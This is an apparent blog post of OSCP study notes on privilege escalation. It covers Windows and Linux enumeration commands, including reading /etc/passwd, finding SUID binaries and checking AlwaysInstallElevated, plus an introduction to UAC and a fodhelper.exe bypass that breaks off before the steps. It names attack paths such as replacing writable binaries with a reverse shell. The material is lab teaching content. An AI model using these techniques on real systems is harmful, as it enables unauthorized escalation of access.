---
layout: post
title:  "OSCP Origin Part 18"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Privilege Escalation"
toc: true
comments: false
rating: 3.5
---

Privilege Escalation

18. Privilege Escalation


 we generally seek to gain additional access rights before we candemonstrate the full impact of the compromise.
 
 This process is referred to as Privilege escalationand it is a necessary skill as “direct-to-root” compromises are arguably rare in modernenvironments.
 
 differences in OS versions, patching levels, and various other factors, there are some common escalation approaches.
 
 To leverage these, we will search for misconfigured services, insufficient file permission restrictions on binaries or services,direct kernel vulnerabilities, vulnerable software running with high privileges, sensitive information stored on local files, registry settings that always elevate privileges before executing a binary,installation scripts that may contain hard coded credentials, and many others.

 18.1 Information Gathering

 After compromising a target and gaining the initial foothold as an unprivileged user, our first stepis to gather as much information about our target as possible.

 This allows us to get a betterunderstanding of the nature of the compromised machine and discover possible avenues forprivilege escalation.
 
 we will explore both manual and automated information gathering andenumeration techniques and discuss the strengths and weaknesses of each.

 18.1.1 Manual Enumeration

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/1.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/2.jpg)

Enumerating Users

•this approach allows for morecontrol and can help identify more exotic privilege escalation methods that are often missed byautomated tools.

windows

• The whoami command, available on both Windows and Linux platforms, is a good place to start.

• whoami will display the username the shell is running as. On Windows, we can pass the discovered username as an argument to the net user command togather more information.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/3.jpg)

C:\Users\student>whoami
client251\student
C:\Users\student>net user student
User name student
Full Name
Comment
User's comment
Country/region code 000 (System Default)
Account active Yes
Account expires Never
Password last set 3/31/2018 10:37:35 AM
Password expires Never
Password changeable 3/31/2018 10:37:35 AM
Password required No
User may change password Yes
Workstations allowed All
Logon script
User profile
Home directory
Last logon 11/8/2019 12:56:15 PM
Logon hours allowed All
Local Group Memberships *Remote Desktop Users *Users
Global Group memberships *None
The command completed successfully.

• we are running as the student user and have gathered additionalinformation including the groups the user belongs to.

linux

• On Linux-based systems, we can use the id command to gather user context information:

• The output reveals the we are operating as the student user, which has a User Identifier (UID)443and Group Identifier (GID) of 1000.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/4.jpg)

student@debian:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)

• To discover other user accounts on the system, we can use the net user command on Windowsbased systems

C:\Users\student>net user
User accounts for \\CLIENT251
-------------------------------------------------------------------------------
admin Administrator DefaultAccount
Guest student WDAGUtilityAccount
The command completed successfully.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/5.jpg)

• To enumerate users on a Linux-based system, we can simply read the contents of the /etc/passwdfile.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/6.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/7.jpg)

student@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
...
speech-dispatcher:x:108:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
xrdp:x:114:120::/var/run/xrdp:/bin/false
student:x:1000:1000:Student,PWK,,:/home/student:/bin/bash
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false

 The passwd file lists several user accounts, including accounts used by various services on thetarget machine such as www-data, which indicates that a web server is likely installed

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/8.jpg)

Enumerating the hostname

• A machine’s hostname can often provide clues about its functional roles. More often than not, the hostnames will include identifiable abbreviations such as web for a web server, db for a databaseserver, dc for a domain controller, etc.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/9.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/10.jpg)

• The fairly generic name of the Windows machine does point to a possible naming convention withinthe network that could help us find additional workstations. 

• while the hostname of the Linux clientprovides us with information about the OS in use (Debian).

18.1.1.3 Enumerating the Operating System Version and Architecture

• we may need to rely on kernel exploits that specifically exploit vulnerabilities in the core of a target’s operating system.
 
• These types of exploitsare built for a very specific type of target, specified by a particular operating system and version combination. 
 
• Since attacking a target with a mismatched kernel exploit can lead to system instability.

• On the Windows operating system, we can gather specific operating system and architecture information with the systeminfo utility.

• We can also use findstr along with a few useful flags to filter the output. Specifically, we can match patterns at the beginning of a line with /B and specify a particular search string with /C:.

• In the example below we’ll use these flags to extract the name of the operating system (Name) aswell as its version (Version) and architecture (System).

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/11.jpg)

• The output indicates that the target system is running version 10.0.16299 of Windows 10 Pro on ax86 architecture.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/12.jpg)


• On Linux, the /etc/issue and /etc/*-release files contain similar information. We can also issue the uname -a command:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/13.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/14.jpg)


• The files located in the /etc directory contain the operating system version (Debian 9), and uname-a outputs the kernel version (4.9.0-6) and architecture (i686 / x86).

18.1.1.4 Enumerating Running Processes and Services

• running processes and services that may allow us to elevate our privileges

• the process must run in the context of a privileged account and must either haveinsecure permissions or allow us to interact with it in unintended ways.

• We can list the running processes on Windows with the tasklist450 command. The /SVC flag willreturn processes that are mapped to a specific Windows service.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/15.jpg)

• /SVC = Return services that is part of the specific process.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/16.jpg)

• Getting a list of running processes on the operating system and matching services

• The output reveals that the MySQL service is running on the machine, which may be of interestunder the right conditions.

• Keep in mind that this output does not list processes run by privileged users.

• On Windows-basedsystems, we’ll need high privileges to gather this information, which makes the process more difficult.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/17.jpg)

 On Linux, we can list system processes (including those run by privileged users) with the ps command. We’ll use the a and x flags to list all processes with or without a tty and the u flag to list the processes in a user-readable format.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/18.jpg)

18.1.1.5 Enumerating Networking Information

• analysis of the target host is to review available network interfaces, routes, andopen ports

• This information can help us determine if the compromised target is connected to multiplenetworks and therefore could be used as a pivot.

• the presence of specific virtualinterfaces may indicate the existence of virtualization or antivirus software.

 An attacker may use a compromised target to pivot, or move between connectednetworks. This will amplify network visibility and allow the attacker to targethosts not directly visible from the original attack machine.
 
•  We can also investigate port bindings to see if a running service is only available on a loopbackaddress, rather than on a routable one.

• Investigating a privileged program or service listening onthe loopback interface could expand our attack surface and increase our probability of a privilegeescalation attack.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/19.jpg)

• We can begin our information gathering on the Windows operating system with ipconfig, using the /all flag to display the full TCP/IP configuration of all adapters.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/20.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/21.jpg)

• To display the networking routing tables, we will use the route command followed by the printargument.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/22.jpg)

• we can use netstat to view the active network connections.

• Specifying the a flag will display all active TCP connections, the n flag allows us to display the address and port number in a numerical form, and the o flag will display the owner PID of each connection.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/23.jpg)

• Not only did netstat provide us with a list of all the listening ports on the machine, it also included information about established connections that could reveal other users connected to this machine that we may want to target later.

• Similar commands are available on a Linux-based host.
 
• Depending on the version of Linux, we can list the TCP/IP configuration of every network adapter with either ifconfig or ip. 
 Both commands accept the a flag to display all information available.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/24.jpg)

• Based on the output above, the Linux client is also connected to more than one network

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/25.jpg)

• We can display network routing tables with either route or routel, depending on the Linux flavor and version.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/26.jpg)

• Finally, we can display active network connections and listening ports with either netstat or ss,461 both of which accept the same arguments.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/27.jpg)

• The output lists the various listening ports and active sessions, including our own active SSHconnection.

18.1.1.6 Enumerating Firewall Status and Rules

• firewall’s state, profile, and rules are only of interest during the remote exploitation phase of an assessment.

• However, this information can be useful during privilege escalation

• if a network service is not remotely accessible because it is blocked bythe firewall, it is generally accessible locally via the loopback interface.

• we can interact with theseservices locally, we may be able to exploit them to escalate our privileges on the local system.

• In addition, we can gather information about inbound and out bound port filtering during this phaseto facilitate port forwarding and tunneling when it’s time to pivot to an internal network.

• On Windows, we can inspect the current firewall profile using the netsh command.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/28.jpg)

• In this case, the current firewall profile is active so let’s have a closer look at the firewall rules.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/29.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/30.jpg)

C:\Users\student>netsh advfirewall firewall show rule name=all


• We can list firewall rules with the netsh command using the following syntax:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/31.jpg)

• According to the two firewall rules listed above, the Microsoft Photos application is allowed to establish both inbound and outbound connections to and from any IP address using any protocol. 

• Keep in mind that not all firewall rules are useful but some configurations may help us expand ourattack surface.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/32.jpg)

• On Linux-based systems, we must have root privileges to list firewall rules with iptables.
 
• depending on how the firewall is configured, we may be able to glean information aboutthe rules as a standard user

• the iptables-persistent464 package on Debian Linux saves firewall rules in specific filesunder the /etc/iptables directory by default.

These files are used by the system to restore netfilter465rules at boot time.

These files are often left with weak permissions, allowing them to be read byany local user on the target system.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/33.jpg)

-H = show filename
-s = supress errors.

• We can also search for files created by the iptables-save command, which is used to dump thefirewall configuration to a file specified by the user.

• This file is then usually used as input for the iptables-restore command and used to restore the firewall rules at boot time.

• If a system administrator had ever run this command, we could search the configuration directory (/etc) or grep the file system for iptables commands to locate the file. 

• If the file has insecure permissions, we could use the contents to infer the firewall configuration rules running on the system.


18.1.1.7 Enumerating Scheduled Tasks

• Attackers commonly leverage scheduled tasks in privilege escalation attacks.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/34.jpg)

• We can create and view scheduled tasks on Windows with the schtasks command. The /query argument displays tasks and /FO LIST sets the output format to a simple list. We can also use /V to request verbose output.

• Systems that act as servers often periodically execute various automated, scheduled tasks. 

• The scheduling systems on these servers often have some what confusing syntax, which is used to execute user-created executable files or scripts.

• When these systems are misconfigured, or the user-created files are left with ins ecure permissions, we can modify these files that will be executedby the scheduling system at a high privilege level.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/35.jpg)

• The output generated by schtasks includes a lot of useful information such as the task to run, the next time it is due to run, the last time it ran, and details about how often it will run.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/36.jpg)

• The Linux-based job scheduler is known as Cron. Scheduled tasks are listed under the /etc/cron.*

• where * represents the frequency the task will run on. For example, tasks that will be run daily can be found under /etc/cron.daily. Each script is listed in its own subdirectory.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/37.jpg)

• Listing the directory contents, we notice several tasks scheduled to run daily.

• It is worth noting that system administrators often add their own scheduled tasks in the /etc/crontab file. 


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/38.jpg)


• This example reveals a backup script running as root. If this file has weak permissions, we may be able to leverage this to escalate our privileges.

18.1.1.8 Enumerating Installed Applications and Patch Levels

• we may need to leverage an exploit to escalate our local privileges.
 
• If so, our search for a working exploit begins with the enumeration of all installed applications, noting the version of each 
 (as well as the OS patch level on Windows-based systems).
 
• powerful Windows-based utility, wmic to automate this process on Windows systems.

• The wmic utility provides access to the Windows Management Instrumentation, which is theinfrastructure for management data and operations on Windows.

• We can use wmic with the product WMI class argument followed by get, which, as the namestates, is used to retrieve specific property values. We can then choose the properties we are interested in, such as name, version, and vendor.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/39.jpg)

• One important thing to keep in mind is that the product WMI class only lists applications that areinstalled by the Windows Installer.

• Information about installed applications could be useful as we look for privilege escalation attacks.

• Similarly, and more importantly, wmic can also be used to list system-wide updates by querying the Win32_QuickFix Engineering (qfe)472 WMI class.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/40.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/41.jpg)


 A combination of the HotFixID and the InstalledOn information can provide us with a precise indication of the security posture of the target Windows operating system. According to this output,this system has not been updated recently, which might make it easier to exploit.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/42.jpg)

this is not updated recently.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/43.jpg)

• Linux-based systems use a variety of package managers. For example, Debian-based Linux distributions use dpkg while Red Hat based systems use rpm.474


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/44.jpg)

• To list applications installed (by dpkg) on our Debian system, we can use 
  dpkg -l.
  
• This confirms what we expected earlier: the Debian machine is, in fact, running a web server. In thiscase, it is running Apache2.


18.1.1.9 Enumerating Readable/Writable Files and Directories

• files with insufficient access restrictions can create a vulnerability thatcan grant an attacker elevated privileges.

• This most often happens when an attacker can modifyscripts or binary files that are executed under the context of a privileged account.

• sensitive files that are readable by an unprivileged user may contain importantinformation such as hardcoded credentials for a database or a service account.

• manually check the permissions of each file and directory, we need toautomate this task as much as possible

• There are a number of utilities and tools that can automate this task for us on a Windows platform. 

• AccessChk from SysInternals is arguably the most well-known and often used tool for this purpose.

• we will demonstrate how to use Access Chk to find a file with insecure file permissions in the Program Files directory. Please note that the target binary file was simply created for the purposes of this exercise.

• we will enumerate the Program Files directory in search of any file or directory that allows the Everyone group write permissions.

• We will use -u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search.

• The additional options are also worth exploring as this tool is quite useful

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/45.jpg)

c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Prog
ram Files"

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/46.jpg)

• AccessChk successfully identified one executable file that is world-writable.

• If this file were to be executed by a privileged user or a service account, we could attempt to over write it with a malicious file of our choice, such as a reverse shell, in order to elevate our privileges

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/47.jpg)

• We can also accomplish the same goal using PowerShell. 

• This is useful in situations where we maynot be able to transfer and execute arbitrary binary files on our target system.

• The PowerShell command itself  may appear somewhat complex, sowe’ll walk through the options.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/48.jpg)

PS C:\Tools\privilege_escalation\SysinternalsSuite>Get-ChildItem "C:\Program Files" -R
ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}


• The primary cmd let we are using is Get-Acl, which retrieves all permissions for a given file or directory. 
 
• However, since Get-Acl cannot be run recursively, we are also using the 
 Get-Child Item cmd let to first enumerate everything under the Program Files directory.
 
• This will effectively retrieve every single object in our target directory along with all associated access permissions.
  
• The Access To String property with the -match flag narrows down the results to the specific access properties we are looking for. In our case, we are searching for any object can be modified (Modify)by members of the Everyone group.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/49.jpg)

• In this case, the output is identical to that of Access Chk. This command sequence allows for additional formatting options.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/50.jpg)
student@debian:~$ find / -writable -type d 2>/dev/null


• On Linux operating systems, we can use find to identify files with insecure permissions.

• 2 > means "redirect standard-error" to the given file.
 /dev/null is the null file. Anything written to it is discarded.
 Together they mean "throw away any error messages

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/51.jpg)



• In the example below, we are searching for every directory writable by the current user on the target system. 
 
• We search the whole root directory (/) and use the -writable argument to specify the attribute we are interested in. 
 
• We also use -type d to locate directories, and we filter errors with2>/dev/null

• several directories seem to be world-writable, including the /usr/local/james/bin directory. This certainly warrants further investigation.

18.1.1.10 Enumerating Unmounted Disks

• drives are automatically mounted at boot time. Because of this, 
 it’s easy to forget about unmounted drives that could contain valuable information.
 
• On Windows-based systems, we can use mountvol to list all drives that are currently mounted as well as those that are physically connected but unmounted.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/52.jpg)

c:\Users\student>mountvol

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/53.jpg)

In this case, the system has two mount points that map to the C: and D: drives respectively. 

Wealso notice that we have a volume with the globally unique identifier (GUID) 25721a7f-0000-0000-0000-100000000000, which has no mount point.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/54.jpg)

• On Linux-based systems, we can use the mount command to list all mounted filesystems. 

• Inaddition, the /etc/fstab file lists all drives that will be mounted at boot time.

 Keep in mind that the system administrator might have used customconfigurations or scripts to mount drives that are not listed in the /etc/fstab file.
 
 Because of this, it’s good practice to not only scan /etc/fstab, but to also gatherinformation about mounted drives with mount.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/55.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/56.jpg)

• The output reveals a swap partition and the primary ext4 disk of this Linux system. 

• Furthermore,we can use lsblk to view all available disks.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/57.jpg)

student@debian:~$ /bin/lsblk

• sda drive consists of three different partitions, which are numbered. 
 
• In some situations, showing information for all local disks on the system might reveal partitions that are not mounted. 
 
• Depending on the system configuration (or misconfiguration), we then might be able to mount those partitions and search for interesting documents, credentials, or other information .

• that could allow us to escalate our privileges or get a better foothold in the network

18.1.1.11 Enumerating Device Drivers and Kernel Modules


• Another common privilege escalation involves exploitation of device drivers and kernel modules.


• Since this technique relies on matching vulnerabilities with corresponding exploits, we’ll need to compile a list of drivers and kernel modules that are loaded on the target.

• On Windows, we can begin our search with the driverquery command. We’ll supply the /v argument for verbose output as well as /fo csv to request the output in CSV format.

• 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/58.jpg)

c:\Users\student>powershell
PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis
play Name’, ‘Start Mode’, Path


• To filter the output, we will run this command inside a powershell session.

• Within PowerShell, we will pipe the output to the ConvertFrom-Csv cmd let as well as Select-Object, which will allow us to select specific object properties or sets of objects including Display Name, Start Mode, and Path


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/59.jpg)

PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D
riverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}


• While this produced a list of loaded drivers, we must take another step to request the version number of each loaded driver.
 
• We will use the Get-WmiObject cmd let to get the Win32_PnPSignedDriver WMI instance, which provides digital signature information about drivers. By piping the output to Select-Object, we can enumerate specific properties, including the

• DriverVersion. Furthermore, we can specifically target drivers based on their name by piping theoutput to Where-Object

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/60.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/61.jpg)
student@debian:~$ lsmod

• Linux, we can enumerate the loaded kernel modules using lsmod without any additionalarguments.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/62.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/63.jpg)
student@debian:~$ /sbin/modinfo libata

• Once we have the list of loaded modules and identify those we want more information about, like libata in the above example, we can use modinfo to find out more about the specific module.
 
• Note that this tool requires a full pathname to run.
 
• Similar to the Windows case demonstrated above, after obtaining a list of drivers and their versions, we are better positioned to find relevant exploits if they exist.


18.1.1.12 Enumerating Binaries That AutoElevate

• OS-specific“shortcuts” to privilege escalation

• Windows systems, we should check the status of the Always Install Elevated registry setting. 

• If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE,any user can run Windows Installer packages with elevated privileges.

• We can use reg query to check these settings:
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/64.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/65.jpg)
c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Insta
ller

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

 AlwaysInstallElevated REG_DWORD 0x1
 
c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Inst
aller

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

 AlwaysInstallElevated REG_DWORD 0x1
 

• If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.


Similarly, on Linux-based systems we can search for SUID files.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/66.jpg)

• when running an executable, it inherits the permissions of the user that runs it. 

• However,if the SUID permissions are set, the binary will run with the permissions of the file owner.

•  This means that if a binary has the SUID bit set and the file is owned by root, any local user will be ableto execute that binary with elevated privileges.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/67.jpg)

• We find command to search for SUID-marked binaries.

• In this case, we are starting our search at the root directory (/), looking for files (-type f) with the SUID bit set, (-perm -u=s)and discarding all error messages (2>/dev/null):

student@debian:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/userhelper
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
/bin/ntfs-3g
/bin/ping

• In this case, the command found several SUID binaries.

•  Exploitation of SUID binaries will vary basedon several factors.

•  For example, if /bin/cp (the copy command) were SUID, we could copy and over write sensitive files such as /etc/passwd.
18.1.1.13 Exercise

1. Perform various manual enumeration methods covered in this section on both your dedicated Windows and Linux clients.


2.Try experimenting with various options for the tools and commands used in this section.
18.1.2 Automated Enumeration

18.1.2 Automated Enumeration

• each operating system contains a wealth of information that can be used for further attacks. 

• Regardless of the target operating system, collecting this detailed information manuallycan be rather time-consuming. 

• one such script is windows-privesc-check, which can be found in the windowsprivesc-check Github repository.

• The repository already includes a Windows executable generated by PyInstaller, but it can also be rebuilt as needed.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/68.jpg)
c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe
-h


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/69.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/70.jpg)
c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe
--dump -G

• This tool accepts many options, but we will walk through some quick examples.
 
• First, we will list information about the user groups on the system.
 
• We’ll specify the self-explanatory --dump to view output, and -G to list groups.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/71.jpg)

• The script successfully executes and we are presented with the information about the securitygroups on the system.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/72.jpg)

• Similar to windows-privesc-check on Windows targets, we can also use unix_privesc_check on UNIX derivatives such as Linux.
 
• We can view the tool help by running the script without any arguments.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/73.jpg)
student@debian:~$./unix-privesc-check

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/74.jpg)
student@debian:~$ ./unix-privesc-check standard > output.txt


• As shown in the listing above, the script supports “standard” and “detailed” mode.
 
• Based on the provided information, the standard mode appears to perform a speed-optimized process and should provide a reduced number of false positives.
 
• Therefore, in the following example we will usethe standard mode and redirect the entire output to a file called output.txt.

• This output reveals that anyone on the system can edit the /etc/passwd file.

• This is quite significantas it allows attackers to easily elevate their privileges or create user accounts on the target. 



18.1.2.1 Exercises

1. Inspect your Windows and Linux clients by using the tools and commands presented in this section in order to get comfortable with manual local enumeration techniques.


2. Experiment with different windows-privesc-check and unix_privesc_check options.
18.2 Windows Privilege Escalation Examples


• In this section, we will discuss Windows privileges, integrity mechanisms, and user account control(UAC).
 
• We will demonstrate UAC bypass techniques and leverage kernel driver vulnerabilities,insecure file permissions, and un quoted service paths to escalate our privileges on the target.
18.2.1 Understanding Windows Privileges and Integrity Levels


• Privileges on Windows operating systems refer to the permissions of a specific account to perform system-related local operations.

• This includes actions such as modifying the filesystem,adding users, shutting down the system, and so on.
 
• In order for these privileges to be effective, the Windows operating system   uses objects called access tokens.

• Once a user is authenticated, Windows generates an access token that is
   assigned to that user. 
 
• The token itself contains various pieces of information that effectively describe the security context of a given user, including the user privileges.
  
• Finally, these tokens need to be uniquely identifiable given the information they contain. 
 
• This is accomplished using a security identifier or SID, which is a unique value that is assigned to each object (including tokens), such as a user or group account.
 
• These SIDs are generated and maintained by the Windows Local Security Authority.
 
• In addition to privileges, Windows also implements what is known as an integrity mechanism.

• This is a core component of the Windows security architecture and works by assigning integrity levels to application processes and securable objects.

• Simply put, this describes the level of trust the operating system has in running applications or securable objects.
 
• As an example, the configured integrity level dictates what actions an application can perform, including the ability to read from or write to the local file system.
  
• APIs can also be blocked from specific integrity levels.
  
• From Windows Vista onward, processes run on four integrity levels:
 
 • System integrity process: SYSTEM rights
 • High integrity process: administrative rights
 • Medium integrity process: standard user rights
 • Low integrity process: very restricted rights often used in sandboxed 	processes
18.2.2 Introduction to User Account Control (UAC)


 User Account Control (UAC) is an access control system introduced by Microsoft with Windows Vista and Windows Server 2008. 
 
 While UAC has been discussed and investigated for quite a longtime now, it is important to stress that Microsoft does not consider it to be a security boundary.
 
 Rather, UAC forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access. 
 
 It will block installers and unauthorized applications from running without the permissions of an administrative account and also blocks changes to system settings. 
 
 In general, the effect of UAC is that any application that wishes to perform an operation with a potential system-wide impact, cannot do so silently.At least in theory


• It is also important to highlight the fact that UAC has two different modes:
 credential prompt and consent prompt. 
 
• The difference is rather simple. When a standard user wishes to perform an administrative task such as installing a new application, and UAC is enabled, the user will see the credential prompt.

• In other words, the credentials of an administrative user will be required to complete the task. 

• presented with a consent prompt. In this case, the user simply has to confirm that the task should be completed and no re-entry of user credentials is required.
 
• As an example, in the following figure the Windows Command Processor running under the standard user account is attempting to perform a privileged action.

• UAC acts according to its notification settings (Always Notify in this case), pausing the target process cmd.exe and prompting for an admin username and password to perform the requested privileged action.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/75.jpg)

• Even while logged in as an administrative user, the account will have two security tokens, one running at a medium integrity level and the other at high integrity level.

• UAC acts as the separation mechanism between those two integrity levels.


 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/76.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/77.jpg)
c:\Users\admin>whoami /groups
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/78.jpg)


• To see integrity levels in action, let’s first login as the admin user, open a command prompt, and run the whoami /groups command:

• As reported on the last line of output, this command prompt is currently operating at a Medium integrity level.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/79.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/80.jpg)
C:\Users\admin> net user admin Ev!lpass
System error 5 has occurred.
Access is denied.

• The request is denied, even though we are logged in as an administrative user.

• In order to change the admin user’s password, we must switch to a high integrity level even if we are logged in with an administrative user.

• In our example, one way to do this is through powershell.exe with the Start-Process  cmdlet specifying the “Run as administrator” option:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/81.jpg)
C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs


• After submitting this command and accepting the UAC prompt, we are presented with a new highintegrity cmd.exe process

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/82.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/83.jpg)

• Let’s check our integrity level using the whoami506 utility using the /groups argument and attemptto change the password again:
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/84.jpg)
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/85.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/86.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/87.jpg)

18.2.3 User Account Control (UAC) Bypass: fodhelper.exe Case Study


18.2.3 User Account Control (UAC) Bypass: fodhelper.exe Case Study

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/88.jpg)

• UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that allows an administrator user to bypass UAC by silently elevating our integrity level from medium to high.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/89.jpg)

• Most of the publicly known UAC bypass techniques target a specific operating system version. 
 
• In this case, the target is our lab client running Windows 10 build 1709.
 
• We will leverage an interesting UAC bypass based on fodhelper.exe,a Microsoft support application responsible formanaging language changes in the operating system. 

• Specifically, this application is launched whenever a local user selects the “Manage optional features” option in the “Apps & features”Windows Settings screen.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/90.jpg)

• As we will soon demonstrate, the fodhelper.exe binary runs as high integrity on Windows 10 1709.
 
• We can leverage this to bypass UAC because of the way fodhelper interacts with the Windows Registry. 
  
• More specifically, it interacts with registry keys that can be modified without administrative privileges.
 
